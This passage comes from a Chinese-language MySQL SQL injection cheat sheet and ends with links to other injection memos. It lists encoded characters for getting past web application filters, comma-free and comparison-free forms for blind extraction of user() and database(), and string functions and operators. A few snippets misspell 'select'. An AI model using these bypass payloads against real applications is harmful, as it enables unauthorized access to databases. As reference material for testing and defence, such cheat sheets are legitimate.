**`%u0020 %uff00`**

**`%c0%20 %c0%a0 %e0%80%a0`**

> **左括号 (：**

**`%u0028 %uff08`**

**`%c0%28 %c0%a8`**

**`%e0%80%a8`**

> **右括号)：**

**`%u0029 %uff09`**

**`%c0%29 %c0%a9`**

**`%e0%80%a9`**

**逗号绕过**

**`mid(user() from 1 for 1)`**

**`substr(user() from 1 for 1)`**

**`select substr(user()from -1) from yz ;`**

**`select ascii(substr(user() from 1 for 1)) < 150;`**

> **同时也可以利用替换函数**

**`select left(database(),2)>'tf';`**

**`selete * from testtable limit 2,1;`**

**`selete * from testtable limit 2 offset 1;`**

**比较符号绕过**

**过滤了`>`或者`<`，我们可以用`greatest`或者`least`**

**`greatest(ascii(mid(user(),0,1)),150)`**

**`least(ascii(mid(user(),0,1)),150)`**

**字符串比较函数**

- **strcmp(expr1,expr2) 如果两个字符串是一样则返回0，如果第一个小于第二个则返回 -1**
- **find_in_set(str,strlist) 如果相同则返回1，不同则返回0**

**字符串连接函数**

- **concat(str1,str2) 将字符串首尾相连**
- **concat_ws(separator,str1,str2) 将字符串用指定连接符连接**
- **group_concat()**

#### 运算符

**算数运算符**

**`+ - * /`**

**比较运算符**

**`= <> != > <`**

- **between**
  - **`select database() between 0x61 and 0x7a;`**
  - **`select database() between 'a' and 'z';`**

- **in**
  - **`select ’123‘ in (’12‘)=>0`**

- **Like(模糊匹配)**
  - **`select ‘12345’ like ‘12%’=> true`**

- **regexp 或 rlike (正则匹配)**
  - **`select ‘12345’ regexp ‘^12’ => true`**

**逻辑运算符**

**`not 或 ！ 非`**

**`and 逻辑与 == &&`**

**`or 逻辑或 == ||`**

**`xor 逻辑异或 == ^`**

**位运算符**

**`& 按位与`**

**`| 按位或`**

**`^ 按位异或`**

**`! 取反`**

**`<< 左移`**

**`>> 右移`**

### Reference

**[当表名可控的注入遇到了Describe时的几种情况](http://www.yulegeyu.com/2017/04/16/当表名可控的注入遇到了Describe时的几种情况。/)**

**[MySQL Error Based SQL Injection （报错注入）总结](https://uknowsec.cn/posts/notes/MySQL Error Based SQL Injection （报错注入）总结.html)**

**[MySql注入备忘录](https://chybeta.github.io/2017/07/21/MySql注入备忘录/)**

**[SQL注入备忘录](http://p0desta.com/2018/03/29/SQL注入备忘录/)**

**[SQL注入绕过技巧](http://byd.dropsec.xyz/2016/08/01/SQL-Injection绕过技巧/)**